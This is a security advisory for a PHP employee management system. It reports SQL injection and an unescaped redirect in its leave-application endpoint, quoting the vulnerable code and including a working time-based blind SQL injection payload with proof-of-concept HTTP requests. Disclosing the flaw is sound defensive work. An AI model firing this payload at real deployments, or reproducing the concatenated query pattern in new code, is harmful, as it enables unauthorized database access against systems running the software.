## EMPLOYEE_MANAGEMENT_SYSTEM file `370project/process/applyleaveprocess.php` contains a SQL Injection vulnerability and unescaped redirect parameter reflection

Impact of the vulnerability
User-controlled input (`id`) is inserted into an SQL `INSERT` statement without parameterization, which may allow an attacker to:

- Manipulate database queries (unauthorized data insertion/modification depending on DB permissions)
- Use blind techniques (e.g., time delays) to infer database behavior
  Additionally, the same untrusted `id` value is placed into an HTTP redirect `Location` header, which can cause:
- Response splitting/open redirect–adjacent issues in some environments if not properly handled (depends on server/PHP configuration)

### Payload:

101'and(select*from(select+sleep(5))a/**/union/**/select+1)='

```
101'and(select*from(select+sleep(5))a/**/union/**/select+1)='
```

### POC:

The vulnerable endpoint is `GET /process/applyleaveprocess.php?id=...` (with POST body for form fields). The `id` parameter is directly concatenated into the SQL statement and also reflected into the redirect location:

$id = $_GET['id'];

...

$sql = "INSERT INTO `employee_leave`(`id`,`token`, `start`, `end`, `reason`, `status`) VALUES ('$id','','$start','$end','$reason','Pending')";

$result = mysqli_query($conn, $sql);

header("Location:..//eloginwel.php?id=$id");

- Baseline request (normal behavior; redirects):

POST /process/applyleaveprocess.php?id=101 HTTP/1.1

Host: 370project:82

Content-Type: application/x-www-form-urlencoded

Connection: close

reason=test&start=2026-04-09&end=2026-04-10

- Time-delay verification request (authorized testing; provide a URL-encoded time-delay expression in `id`; still redirects after DB execution):

POST /process/applyleaveprocess.php?id=<URL_ENCODED_TIME_DELAY_PAYLOAD> HTTP/1.1

Host: 370project:82

Content-Type: application/x-www-form-urlencoded

Connection: close

reason=test&start=2026-04-09&end=2026-04-10

Expected result:
Compared to the baseline, the verification request responds noticeably slower by approximately `<DELAY_SECONDS>`, then returns `302 Found`. The `Location` header includes the supplied `id` value (as you observed), confirming untrusted data reflection in the redirect.

### Sources download:

https://code-projects.org/employee-management-system-in-php-with-source-code/

```
https://code-projects.org/employee-management-system-in-php-with-source-code/
```



![image-20260409160919015](https://raw.githubusercontent.com/zzzxc643/images/main/image/image-20260409160919015.png)